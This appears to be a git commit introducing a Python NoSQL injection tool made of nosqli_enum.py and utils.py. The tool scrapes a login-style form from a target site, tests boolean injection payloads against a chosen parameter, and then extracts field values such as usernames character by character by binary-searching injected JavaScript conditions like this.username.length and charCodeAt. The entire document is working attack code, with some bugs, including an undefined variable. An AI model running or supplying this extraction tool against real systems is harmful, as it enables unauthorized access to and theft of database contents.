87fcf81226907b1518ae8a35d18d44ecd5844a4c
parzival-hub <eric@kahlert-essen.de>
2024-09-20 16:17:16 +0200

    Init

---
+++ nosqli_enum.py
@@ -0,0 +1,106 @@
+import argparse
+from payloads import *
+from utils import *
+
+
+#TODO
+# implement custom fail string implementation
+# 
+                    
+
+def scan_array_payloads():
+    #if payload.startswith("%5b"): # %5b = [
+        #       r_data = remove_char_at_index(r_data, r_data.index(f"§{index}§")-1)
+        #      r_data = r_data.replace(f"§{index}§", payload)
+    pass
+
+def scan_bool_payloads(url, form_data,scan_param_name, default_response):    
+    success_payloads=[]
+    error_payloads=[]
+
+    for payload, extraction_payload in bool_payloads:        
+        # prepare data
+        r_data = form_data["post_data"].replace(f"§{scan_param_name}§", quote(payload))
+
+        #send request
+        response = send_post_request(url, r_data)
+
+        #is request error
+        if response.status_code != default_response.status_code:
+            print(f"[?] Unexpected Status Code: {response.status_code} {payload}")       
+            error_payloads.append([response.status_code, response, [payload, extraction_payload]])
+        # is request success
+        elif len(response.text) != len(default_response.text):            
+            print(f"[+] SUCCESS:{payload}")       
+            success_payloads.append([payload, extraction_payload])     
+
+    return success_payloads, error_payloads
+
+def main():
+    parser = argparse.ArgumentParser(description="Simple NoSQL Enumeration Tool")
+    #parser.add_argument('-u', '--url', help="Scan Url to scan")
+    parser.add_argument('-t', '--target', help="Scan Target to extract form from")
+    parser.add_argument('-p', '--parameter', help="Parameter to test")
+    parser.add_argument('-f', '--fail_string', help="Response string for failed requests")
+    #parser.add_argument('--arrays', action='store_true', help="Activate array payloads")
+    #parser.add_argument('--time', action='store_true', help="Activate time payload")
+    #parser.add_argument('-d', '--data', action='store_true', help="Post Data")
+
+    args = parser.parse_args()
+    if not args.parameter or not args.target:
+        print("[-] Target parameter and target url have to be set")                
+        exit()
+
+    # init arg params
+    scan_param_name=args.parameter
+    fail_message=args.fail_string
+
+    # extract post data from html form
+    form_target=args.target
+    if not form_target.startswith("http://") or form_target.startswith("http://"):
+        form_target = "http://" + form_target
+    form_data = extract_form_data(form_target,scan_param_name)
+
+    # prepare attack target url
+    parsed_url = urlparse(form_target)
+    url = f"{parsed_url.scheme}://{parsed_url.netloc}"+form_data["action"]    
+    print(form_data)
+
+
+    # get default response for random payload
+    default_response = get_random_payload_response(form_data, scan_param_name, url)
+    # check if page is dynamic
+    default_response_2 = get_random_payload_response(form_data, scan_param_name, url)
+
+    if len(default_response.text) == len(default_response_2.text):
+        print("[+] Page content is not dynamic")
+    else:
+        print("[-] Page content is dynamic")
+        print("[-] You need to specify a fail or success string.")
+        exit()
+
+    # Start Scanning
+    success_payloads, error_payloads = scan_bool_payloads(url,form_data,scan_param_name, default_response)
+
+    # display results
+    print("Successfull payloads:")
+    for p in success_payloads:
+        print(p)
+    print("Error inflicting payloads:")
+    for p in error_payloads:
+        print(p)
+        
+    for payload, extraction_payload in success_payloads:
+        # validate insertion point with request param as extraction attribute
+        extraction_attribute_length = get_extraction_parameter_length(url, form_data,scan_param_name, default_response, extraction_payload, scan_param_name)
+        if extraction_attribute_length:
+            extraction_point = extraction_payload
+            break
+    
+    brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, "username", extraction_attribute_length)
+    send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response)
+    #if args.arrays:  
+    #    scan_array_payloads()
+
+
+main()
---
+++ utils.py
@@ -0,0 +1,156 @@
+import random
+import string
+from bs4 import BeautifulSoup
+import requests
+from urllib.parse import quote, urlparse
+
+def extract_form_data(url,scan_param_name):
+    print(f"[+] Extracting form data from {url}")
+
+    # Send HTTP request to the page
+    response = requests.get(url)
+    if not response or response.status_code != 200:
+        print("[-] Error: Unable to fetch page.")
+        exit()
+
+    # Use BeautifulSoup to parse the HTML page
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    # Find the first form on the page
+    form = soup.find('form')
+    if not form:
+        print("[-] Error: No form found on the page.")
+        exit()
+
+    # Extract input fields from the form
+    form_data = {
+        'action': form.get('action', ''),
+        'method': form.get('method').upper(),
+        'post_data': ""
+    }
+
+    if not form_data["method"]:
+        print("Errror: No method extacted...")
+        exit()
+
+    param_counter = 0
+    for input_tag in form.find_all('input'):
+        name = input_tag.get('name', '')
+        # For each input, store its name, type, and default value if any
+        if name:
+            if name == scan_param_name:                
+                form_data["post_data"] += f"{name}=§{scan_param_name}§&"
+                param_counter+=1
+            else:            
+                form_data["post_data"] += f"{name}=x&"
+                param_counter+=1
+    for button in form.find_all('button', attrs={'type': 'submit'}):
+        name = button.get('name', '')
+        if name:
+            if name == scan_param_name:                
+                form_data["post_data"] += f"{name}=§{scan_param_name}§&"
+                param_counter+=1
+            else:            
+                form_data["post_data"] += f"{name}=x&"
+                param_counter+=1
+    form_data["post_data"] = form_data["post_data"].rstrip("&")
+    form_data["param_count"] = param_counter
+    return form_data
+
+
+def generate_random_string(length):
+    # Define the character set (uppercase, lowercase, digits)
+    characters = string.ascii_letters + string.digits
+    # Use random.choices to generate a random string
+    random_string = ''.join(random.choices(characters, k=length))
+    return random_string
+
+def get_random_payload_response(form_data, scan_param_name, url):
+    default_r_data = form_data["post_data"].replace(f"§{scan_param_name}§", generate_random_string(8))
+    default_response = send_post_request(url, default_r_data)
+    if not default_response:
+        raise Exception("Default Response failed")
+    return default_response
+
+
+def send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
+    # create payload by replacing injection point 
+    payload = extraction_point.replace("§inject§", extraction_payload)
+    # insert payload into request
+    r_data = form_data["post_data"].replace(f"§{insertion_param_name}§", quote(payload))
+    response = send_post_request(url, r_data)
+    if response == None:
+        raise Exception("Extraction response is None")
+    return len(response.text) != len(default_response.text)
+    
+
+
+def send_post_request(r_url, r_data):
+    #print("Requesting:",r_url, r_data)
+    r = requests.post(r_url,
+        headers={"Content-Type":"application/x-www-form-urlencoded"},
+        data=r_data,
+    )    
+    return r
+
+def get_extraction_parameter_length(url, form_data,insertion_param_name, default_response, extraction_point, extraction_attribute_name):
+        low = 1 
+        high = 1000 
+        mid = 0
+        while low <= high:
+            mid = (high + low) // 2 # Caluclate the midpoint of the search area
+            
+            # test if length is bigger than mid
+            extraction_payload = f'this.{extraction_attribute_name}.length > {mid}'    
+            if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
+                low = mid + 1 
+                continue
+            
+            # test if length is smaller than mid
+            extraction_payload = f'this.{extraction_attribute_name}.length < {mid}'    
+            if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
+                high = mid - 1
+                continue
+            
+            # length should be found
+            extraction_payload = f'this.{extraction_attribute_name}.length = {mid}'    
+            if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
+                print(mid)                
+                return mid  
+
+def brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, extraction_attribute_name, extraction_attribute_length):
+    result= ""
+    for i in range(extraction_attribute_length):
+        new_found = False
+        low = 32 # Set low value of search area (' ')
+        high = 127 # Set high value of search area ('~')
+        mid = 0
+        while low <= high:
+            mid = (high + low) // 2 # Caluclate the midpoint of the search area
+            
+            # test if length is bigger than mid
+            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) > {mid}'    
+            if send_extraction_request(url, form_data, extraction_point, extraction_payload, scan_param_name, default_response):
+                low = mid + 1 
+                continue
+            
+            # test if length is smaller than mid
+            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) < {mid}'   
+            if send_extraction_request(url, form_data, extraction_point, extraction_payload, scan_param_name, default_response):
+                high = mid - 1
+                continue
+            
+            # length should be found
+            result += chr(mid)
+            print(result)   
+            new_found = True
+            break
+
+        if not new_found:
+            raise Exception(f"No new char could be found for: {extraction_attribute_name} at index {i} (max length: {extraction_attribute_length})")                             
+    return result
+
+def remove_char_at_index(s, index):
+    if index < 0 or index >= len(s):
+        raise IndexError("Index out of range")
+    return s[:index] + s[index + 1:]
